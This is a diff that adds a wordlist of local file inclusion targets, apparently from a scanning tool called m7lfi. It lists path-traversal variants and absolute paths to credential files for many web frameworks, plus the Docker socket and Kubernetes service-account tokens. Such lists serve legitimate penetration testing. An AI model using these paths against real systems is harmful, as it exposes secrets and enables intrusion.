@@ -1,0 +1,85 @@
+# m7lfi - Framework / CMS Specific LFI Targets
+# Milkyway Intelligence | Sharlix
+
+# ── WordPress ────────────────────────────────────────────────────────────────
+wp-config.php
+../wp-config.php
+../../wp-config.php
+wp-content/uploads/
+wp-includes/
+wp-login.php
+/var/www/html/wp-config.php
+/var/www/wordpress/wp-config.php
+
+# ── Laravel ──────────────────────────────────────────────────────────────────
+.env
+../.env
+../../.env
+../../../.env
+storage/logs/laravel.log
+../storage/logs/laravel.log
+config/app.php
+config/database.php
+config/mail.php
+
+# ── Symfony ───────────────────────────────────────────────────────────────────
+app/config/parameters.yml
+../app/config/parameters.yml
+config/packages/doctrine.yaml
+
+# ── Django ────────────────────────────────────────────────────────────────────
+settings.py
+../settings.py
+../../settings.py
+manage.py
+db.sqlite3
+
+# ── Node.js / Express ─────────────────────────────────────────────────────────
+package.json
+.env
+config/default.json
+config/production.json
+
+# ── Ruby on Rails ─────────────────────────────────────────────────────────────
+config/database.yml
+config/secrets.yml
+config/credentials.yml.enc
+
+# ── Joomla ────────────────────────────────────────────────────────────────────
+configuration.php
+../configuration.php
+/var/www/html/configuration.php
+
+# ── Drupal ────────────────────────────────────────────────────────────────────
+sites/default/settings.php
+../sites/default/settings.php
+/var/www/html/sites/default/settings.php
+
+# ── Magento ───────────────────────────────────────────────────────────────────
+app/etc/local.xml
+app/etc/config.xml
+../app/etc/local.xml
+
+# ── CodeIgniter ───────────────────────────────────────────────────────────────
+application/config/database.php
+application/config/config.php
+../application/config/database.php
+
+# ── Tomcat / Java ─────────────────────────────────────────────────────────────
+/etc/tomcat9/tomcat-users.xml
+/etc/tomcat8/tomcat-users.xml
+/usr/local/tomcat/conf/tomcat-users.xml
+/usr/share/tomcat9/etc/tomcat-users.xml
+WEB-INF/web.xml
+WEB-INF/classes/application.properties
+
+# ── Docker / Container ────────────────────────────────────────────────────────
+/etc/docker/daemon.json
+/.dockerenv
+/run/secrets/
+/var/run/docker.sock
+
+# ── Kubernetes ────────────────────────────────────────────────────────────────
+/var/run/secrets/kubernetes.io/serviceaccount/token
+/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+/var/run/secrets/kubernetes.io/serviceaccount/namespace
